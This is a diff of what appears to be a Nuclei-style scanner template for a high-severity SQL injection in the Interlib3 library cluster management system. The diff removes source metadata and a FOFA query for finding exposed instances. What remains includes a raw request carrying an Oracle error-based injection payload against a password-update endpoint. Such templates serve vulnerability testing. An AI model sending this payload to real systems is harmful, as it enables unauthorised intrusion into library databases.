@@ -3,12 +3,8 @@ info:
   name: 图创图书馆集群管理系统 interlib3 SQL注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/wcqncwyi33dhe9c7'
+  description: ''
   tags: sqli,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: wcqncwyi33dhe9c7
-    fofa: body="interlib/common/" || body="Interlib图书馆集群管理系统" || body="/interlib3/system_index" || body="打开Interlib主界面"
 http:
 - raw:
   - 'GET /interlib3/service/sysop/updOpuserPw?loginid=test&newpassword=12356&token=1%27and+ctxsys.drithsx.sn(1,(select%20MOD(999999,1928)%20from%20dual))=%272 HTTP/1.1
